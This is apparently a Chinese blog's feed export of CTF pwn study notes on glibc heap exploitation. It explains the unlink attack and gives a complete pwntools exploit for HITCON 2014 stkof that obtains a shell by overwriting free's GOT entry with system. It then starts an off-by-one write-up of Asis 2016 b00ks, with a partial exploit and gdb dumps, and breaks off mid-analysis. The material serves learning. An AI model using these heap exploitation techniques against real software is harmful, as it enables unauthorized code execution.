<p><a href="https://noonegroup.xyz/posts/63c0a3ee/" target="_blank" rel="noopener external nofollow noreferrer">https://noonegroup.xyz/posts/63c0a3ee/</a></p>
<p><a href="https://www.cnblogs.com/Theffth-blog/p/12790720.html" target="_blank" rel="noopener external nofollow noreferrer">https://www.cnblogs.com/Theffth-blog/p/12790720.html</a></p>
]]></content>
      <categories>
        <category>heap</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>Tcache</tag>
      </tags>
  </entry>
  <entry>
    <title>Unlink Attack</title>
    <url>/2020/05/22/unlink%E7%B3%BB%E5%88%97%E4%B8%80/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/iMO5rza8ECVkZut.jpg" alt="alt"></p>
<a id="more"></a>

<h3 id="学习笔记"><a href="#学习笔记" class="headerlink" title="学习笔记"></a>学习笔记</h3><p>最近学习了unlink知识，然后将自己对unlink的理解写了下来，本来应该早就开始写的，但是本人太懒了，一直拖到现在才开始。</p>
<h3 id="unlink原理"><a href="#unlink原理" class="headerlink" title="unlink原理"></a>unlink原理</h3><p>关于unlink原理在WIKI上有很详细的讲解，我这里说一下自己的理解。</p>
<p>当申请的chunk不属于fastbin的时候，free该chunk的时候，会检查该chunk的物理相邻低位chunk和高位chunk进行向后合并和向前合并。</p>
<h3 id="unlink执行过程"><a href="#unlink执行过程" class="headerlink" title="unlink执行过程"></a>unlink执行过程</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FD&#x3D;P-&gt;fd &#x3D; target addr -0x18</span><br><span class="line">BK&#x3D;P-&gt;bk &#x3D; expect value</span><br><span class="line">FD-&gt;bk &#x3D; BK，即 *(target addr-0x18+0x18)&#x3D;BK&#x3D;expect value</span><br><span class="line">BK-&gt;fd &#x3D; FD，即 *(expect value +0x10) &#x3D; FD &#x3D; target addr-0x18</span><br></pre></td></tr></table></figure>

<p>在远古时期，只要我们将fd和bk伪造成这样，在unlink的时候我们就可以实现任一地址写了，但是因为加了检查，现实就变的很残酷了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; fd bk</span><br><span class="line">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                      \</span><br><span class="line">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br></pre></td></tr></table></figure>

<p>那么如何绕过检查呢！！！</p>
<p>只要我们将fd修改为<code>P-0x18</code>,bk修改为<code>P-0x10</code>就可以绕过检查了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FD&#x3D;P-&gt;fd &#x3D; P-0x18</span><br><span class="line">BK&#x3D;P-&gt;bk &#x3D; p-0x10</span><br><span class="line">FD-&gt;bk &#x3D; BK，即 *(P-0x18+0x18)&#x3D;BK&#x3D;P-0x10</span><br><span class="line">BK-&gt;fd &#x3D; FD，即 *(P-0x10 +0x10) &#x3D; FD &#x3D; P-0x18</span><br></pre></td></tr></table></figure>

<p>这样我们就可以在P这个chunk的地址上写成<code>P-0x18</code>了。</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li>
<li>已知位置存在一个指针指向可进行 UAF 的 chunk</li>
</ul>
<p>这里以一道例题来演示一下。</p>
<h3 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下："><a href="#main函数如下：" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; &#x2F;&#x2F; eax@2</span><br><span class="line">  __int64 result; &#x2F;&#x2F; rax@19</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; rcx@19</span><br><span class="line">  signed int v6; &#x2F;&#x2F; [sp+Ch] [bp-74h]@9</span><br><span class="line">  char nptr; &#x2F;&#x2F; [sp+10h] [bp-70h]@2</span><br><span class="line">  __int64 v8; &#x2F;&#x2F; [sp+78h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v8 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  alarm(0x78u);</span><br><span class="line">  while ( fgets(&amp;nptr, 10, stdin) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 &#x3D; atoi(&amp;nptr);</span><br><span class="line">    if ( v3 &#x3D;&#x3D; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 &#x3D; edit();</span><br><span class="line">      goto LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v3 &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v3 &#x3D;&#x3D; 3 )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 &#x3D; free_();</span><br><span class="line">        goto LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">      if ( v3 &#x3D;&#x3D; 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 &#x3D; sub_400BA9();</span><br><span class="line">        goto LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v3 &#x3D;&#x3D; 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 &#x3D; add();</span><br><span class="line">      goto LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 &#x3D; -1;</span><br><span class="line">LABEL_14:</span><br><span class="line">    if ( v6 )</span><br><span class="line">      puts(&quot;FAIL&quot;);</span><br><span class="line">    else</span><br><span class="line">      puts(&quot;OK&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  result &#x3D; 0LL;</span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL) ^ v8;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add函数如下："><a href="#add函数如下：" class="headerlink" title="add函数如下："></a>add函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed __int64 add()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; &#x2F;&#x2F; rax@2</span><br><span class="line">  __int64 v1; &#x2F;&#x2F; rcx@4</span><br><span class="line">  __int64 size; &#x2F;&#x2F; [sp+0h] [bp-80h]@1</span><br><span class="line">  void *v3; &#x2F;&#x2F; [sp+8h] [bp-78h]@1</span><br><span class="line">  char s; &#x2F;&#x2F; [sp+10h] [bp-70h]@1</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; [sp+78h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  size &#x3D; atoll(&amp;s);</span><br><span class="line">  v3 &#x3D; malloc(size);</span><br><span class="line">  if ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    *&amp;::s[8 * ++dword_602100] &#x3D; v3;</span><br><span class="line">    printf(&quot;%d\n&quot;, dword_602100, size);</span><br><span class="line">    result &#x3D; 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; 0xFFFFFFFFLL;</span><br><span class="line">  &#125;</span><br><span class="line">  v1 &#x3D; *MK_FP(__FS__, 40LL) ^ v5;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="edit函数如下："><a href="#edit函数如下：" class="headerlink" title="edit函数如下："></a>edit函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; &#x2F;&#x2F; rax@2</span><br><span class="line">  int i; &#x2F;&#x2F; eax@5</span><br><span class="line">  __int64 v2; &#x2F;&#x2F; rcx@11</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [sp+8h] [bp-88h]@1</span><br><span class="line">  __int64 n; &#x2F;&#x2F; [sp+10h] [bp-80h]@5</span><br><span class="line">  char *ptr; &#x2F;&#x2F; [sp+18h] [bp-78h]@5</span><br><span class="line">  char index; &#x2F;&#x2F; [sp+20h] [bp-70h]@1</span><br><span class="line">  __int64 v7; &#x2F;&#x2F; [sp+88h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v7 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  fgets(&amp;index, 16, stdin);</span><br><span class="line">  v3 &#x3D; atol(&amp;index);</span><br><span class="line">  if ( v3 &lt;&#x3D; 0x100000 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *&amp;s[8 * v3] )</span><br><span class="line">    &#123;</span><br><span class="line">      fgets(&amp;index, 16, stdin);</span><br><span class="line">      n &#x3D; atoll(&amp;index);                        &#x2F;&#x2F; size</span><br><span class="line">      ptr &#x3D; *&amp;s[8 * v3];</span><br><span class="line">      for ( i &#x3D; fread(ptr, 1uLL, n, stdin); i &gt; 0; i &#x3D; fread(ptr, 1uLL, n, stdin) )&#x2F;&#x2F; 堆溢出</span><br><span class="line">      &#123;</span><br><span class="line">        ptr +&#x3D; i;</span><br><span class="line">        n -&#x3D; i;</span><br><span class="line">      &#125;</span><br><span class="line">      if ( n )</span><br><span class="line">        result &#x3D; 0xFFFFFFFFLL;</span><br><span class="line">      else</span><br><span class="line">        result &#x3D; 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      result &#x3D; 0xFFFFFFFFLL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; 0xFFFFFFFFLL;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 &#x3D; *MK_FP(__FS__, 40LL) ^ v7;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="free函数如下："><a href="#free函数如下：" class="headerlink" title="free函数如下："></a>free函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed __int64 free_()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; &#x2F;&#x2F; rax@2</span><br><span class="line">  __int64 v1; &#x2F;&#x2F; rcx@6</span><br><span class="line">  unsigned int v2; &#x2F;&#x2F; [sp+Ch] [bp-74h]@1</span><br><span class="line">  char index; &#x2F;&#x2F; [sp+10h] [bp-70h]@1</span><br><span class="line">  __int64 v4; &#x2F;&#x2F; [sp+78h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  fgets(&amp;index, 16, stdin);</span><br><span class="line">  v2 &#x3D; atol(&amp;index);</span><br><span class="line">  if ( v2 &lt;&#x3D; 0x100000 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *&amp;s[8 * v2] )</span><br><span class="line">    &#123;</span><br><span class="line">      free(*&amp;s[8 * v2]);</span><br><span class="line">      *&amp;s[8 * v2] &#x3D; 0LL;</span><br><span class="line">      result &#x3D; 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      result &#x3D; 0xFFFFFFFFLL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; 0xFFFFFFFFLL;</span><br><span class="line">  &#125;</span><br><span class="line">  v1 &#x3D; *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在edit函数中有非常严重的堆溢出漏洞，在bss段有一个用来存放堆指针的数组，这样就满足了unlink的利用条件。</p>
<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><ol>
<li>申请4个chunk，4个chunk大小分别是0x20,0x30,0x80,0x20,然后通过堆溢出修改chunk3触发unlink，这样原本chunk2的堆指针就被我们修改为chunk2-0x18了。</li>
<li>然后我们通过edit函数将chunk1和chunk3的堆指针修改为free_got和puts_got，然后再将free_got修改为puts_plt，来泄露libc</li>
<li>然后将free_got修改为system_addr，将chunk4的内容修改为<code>/bin/sh\x00</code>，然后free掉chunk4来getshell。</li>
</ol>
<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;stkof&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;stkof&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">free_got&#x3D;elf.got[&#39;free&#39;]</span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">puts_plt&#x3D;elf.plt[&#39;puts&#39;]</span><br><span class="line"></span><br><span class="line">def add(size) :</span><br><span class="line">    sh.sendline(&quot;1&quot;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&quot;OK\n&quot;)</span><br><span class="line"></span><br><span class="line">def edit(idx,strings):</span><br><span class="line">    sh.sendline(&quot;2&quot;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.sendline(str(len(strings)))</span><br><span class="line">    sh.send(strings)</span><br><span class="line">    sh.recvuntil(&quot;OK\n&quot;)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    sh.sendline(&quot;3&quot;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(0x20) #1</span><br><span class="line">add(0x30) #2</span><br><span class="line">add(0x80) #3</span><br><span class="line">add(0x20) #4</span><br><span class="line"></span><br><span class="line">target&#x3D;0x602150</span><br><span class="line">fd&#x3D;target-0x18</span><br><span class="line">bk&#x3D;target-0x10</span><br><span class="line"></span><br><span class="line">edit(2,p64(0)+p64(0x30)+p64(fd)+p64(bk)+&#39;a&#39;*0x10+p64(0x30)+p64(0x90))</span><br><span class="line">free(3)</span><br><span class="line"></span><br><span class="line">edit(2,&#39;a&#39;*0x10+p64(free_got)+p64(puts_got))</span><br><span class="line">edit(1,p64(puts_plt))</span><br><span class="line">free(2)</span><br><span class="line">sh.recvuntil(&#39;OK\n&#39;)</span><br><span class="line">puts_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">log.success(&#39;puts_addr: &#39; +hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base&#x3D;puts_addr-libc.symbols[&#39;puts&#39;]</span><br><span class="line">log.success(&#39;libc_base: &#39; +hex(libc_base))</span><br><span class="line">system_addr&#x3D;libc_base+libc.symbols[&#39;system&#39;]</span><br><span class="line">log.success(&#39;system_addr: &#39; +hex(system_addr))</span><br><span class="line"></span><br><span class="line">edit(1,p64(system_addr))</span><br><span class="line">edit(4,&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>参考链接：</p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/#_1" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/#_1</a></p>
<p><a href="https://bbs.pediy.com/thread-247007.htm" target="_blank" rel="noopener external nofollow noreferrer">https://bbs.pediy.com/thread-247007.htm</a></p>
]]></content>
      <categories>
        <category>heap</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>off-by-one</title>
    <url>/2020/05/07/off-by-one/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/1dRlApQUyVtZrgi.jpg" alt="alt"></p>
<a id="more"></a>

<h2 id="堆中的-Off-By-One"><a href="#堆中的-Off-By-One" class="headerlink" title="堆中的 Off-By-One"></a>堆中的 Off-By-One</h2><h3 id="pwn堆入门系列教程1"><a href="#pwn堆入门系列教程1" class="headerlink" title="pwn堆入门系列教程1"></a>pwn堆入门系列教程1</h3><p>最近几天时间都在CTF wiki上学习堆利用，花了好长时间学习了off-by-one的利用。</p>
<h3 id="介绍（引用ctf-wiki）"><a href="#介绍（引用ctf-wiki）" class="headerlink" title="介绍（引用ctf wiki）"></a>介绍（引用ctf wiki）</h3><p>严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</p>
<h3 id="off-by-one-漏洞原理-（引用ctf-wiki）"><a href="#off-by-one-漏洞原理-（引用ctf-wiki）" class="headerlink" title="off-by-one 漏洞原理 （引用ctf wiki）"></a>off-by-one 漏洞原理 （引用ctf wiki）</h3><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p>
<ul>
<li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li>
<li>字符串操作不合适</li>
</ul>
<p>一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。 此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss 段等等，但是堆上（heap based） 的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p>
<h3 id="off-by-one-利用思路-（引用ctf-wiki）"><a href="#off-by-one-利用思路-（引用ctf-wiki）" class="headerlink" title="off-by-one 利用思路 （引用ctf wiki）"></a>off-by-one 利用思路 （引用ctf wiki）</h3><ol>
<li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li>
<li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在 unlink 的块大小是否相等。</li>
</ol>
<p>off-by-one（这样的漏洞在刚开始学习写代码的时候特别容易出现）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">char</span> a[<span class="number">10</span>];</span><br><span class="line">		<span class="keyword">int</span> i;</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">			&#123;</span><br><span class="line">				a[i]=i;</span><br><span class="line">			&#125;</span><br><span class="line">		a[<span class="number">10</span>]=<span class="string">'\0'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	 &#125;</span><br></pre></td></tr></table></figure>

<p>数组总长度是10，从0开始，到9结束。程序错误的使用了a[10]，造成了off-by-one。</p>
<h3 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h3><p>这道题是wiki上关于off-by-one的利用，我按照wiki上的exp，一步一步慢慢调试，终于弄会了，wiki上有俩种利用方法，目前我只弄会了第一种，第二种我会在后续发出来。</p>
<h4 id="checksec检查："><a href="#checksec检查：" class="headerlink" title="checksec检查："></a>checksec检查：</h4><p>​        </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>



<h4 id="漏洞："><a href="#漏洞：" class="headerlink" title="漏洞："></a>漏洞：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">sub_B6D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax@2</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter author name: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_9F5(off_202018, <span class="number">32</span>) ) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fail to read author_name"</span>, <span class="number">32L</span>L);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">sub_9F5</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax@2</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+14h] [bp-Ch]@3</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [sp+18h] [bp-8h]@3</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    buf = a1;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i ) <span class="comment">//最多可以将名字长度写成32字符</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)buf == <span class="number">10</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      buf = (<span class="keyword">char</span> *)buf + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)buf = <span class="number">0</span>;  <span class="comment">//危险部分</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><h5 id="b00k结构体"><a href="#b00k结构体" class="headerlink" title="b00k结构体"></a><code>b00k</code>结构体</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct book&#123;</span><br><span class="line">    int id;</span><br><span class="line">    char *name;</span><br><span class="line">    char *description;</span><br><span class="line">    int size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  程序运行, 创建一个结构体数组,设为<code>b00ks</code>.</p>
<h5 id="b00k位置"><a href="#b00k位置" class="headerlink" title="b00k位置"></a><code>b00k</code>位置</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;30gx 0x555555756040</span><br><span class="line">0x555555756040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555756050:	0x6161616161616161	0x6161616161616161 ----&gt;author name</span><br><span class="line">b00ks&lt;--0x555555756060:	0x0000555555757480(frist b00ks)	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>author name我们可以写入32个字符，程序会在最后加入‘\x00’，当我们创建book1时，frist b00ks会覆盖掉我们的‘\x00’,当我们输出author name时，我们就可以泄露出frist b00ks指针的地址了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def create(name_size,name,des_size,description):</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(str(1))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(name_size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(name)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(des_size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(description)</span><br><span class="line"> def printf () :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(&#39;4&#39;)</span><br><span class="line"> </span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*32</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">create(30,&#39;bb&#39;,255,&#39;cc&#39;)</span><br><span class="line">printf()</span><br><span class="line">sh.recvuntil(&#39;a&#39;*32)</span><br><span class="line">books_one&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print (&#39;books_one:&#39; +hex(books_one))</span><br></pre></td></tr></table></figure>

<h5 id="创建第一个first-b00k"><a href="#创建第一个first-b00k" class="headerlink" title="创建第一个first b00k"></a>创建第一个<code>first b00k</code></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x555b07c4f160:	0x0000000000000001	0x0000555b07c4f020</span><br><span class="line">0x555b07c4f170:	0x0000555b07c4f050	0x00000000000000ff</span><br></pre></td></tr></table></figure>

<p>当我们开辟一个足够大的description，然后再一次修改author name，覆盖frist b00ks指针的最后一个字节，frist b00ks就会指向description，我们可以伪造一个b00k，让其中的name和description指向book2的name和description。这样我们就可以达到任意读写的目的。</p>
<h5 id="空字节覆盖"><a href="#空字节覆盖" class="headerlink" title="空字节覆盖"></a>空字节覆盖</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x557649c66040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x557649c66050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x557649c66060:	0x000055764b977100	0x000055764b977190</span><br></pre></td></tr></table></figure>

<h5 id="伪造b00k"><a href="#伪造b00k" class="headerlink" title="伪造b00k"></a>伪造b00k</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x55764b9770f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55764b977100:	0x0000000000000001	0x000055764b977198 ----</span><br><span class="line">0x55764b977110:	0x000055764b9771a0	0x000000000000ffff	   |</span><br><span class="line">0x55764b977120:	0x0000000000000000	0x0000000000000000     |</span><br><span class="line">0x55764b977130:	0x0000000000000000	0x0000000000000000     |</span><br><span class="line">0x55764b977140:	0x0000000000000000	0x0000000000000000     |</span><br><span class="line">0x55764b977150:	0x0000000000000000	0x0000000000000031     |</span><br><span class="line">0x55764b977160:	0x0000000000000001	0x000055764b977020     |</span><br><span class="line">0x55764b977170:	0x000055764b977050	0x00000000000000ff     |</span><br><span class="line">0x55764b977180:	0x0000000000000000	0x0000000000000031     |</span><br><span class="line">0x55764b977190:	0x0000000000000002	0x00007f4c77d67010 &lt;-- |</span><br><span class="line">0x55764b9771a0:	0x00007f4c77b847a8	0x0000000000021000</span><br></pre></td></tr></table></figure>

<p>因为第二次申请了很大的chunk，所以程序会使用mmap来进行堆的申请，所以<code>second b00k</code>的<code>name pointer</code>和<code>description pointer</code>的指针可以用来泄露libc_base</p>
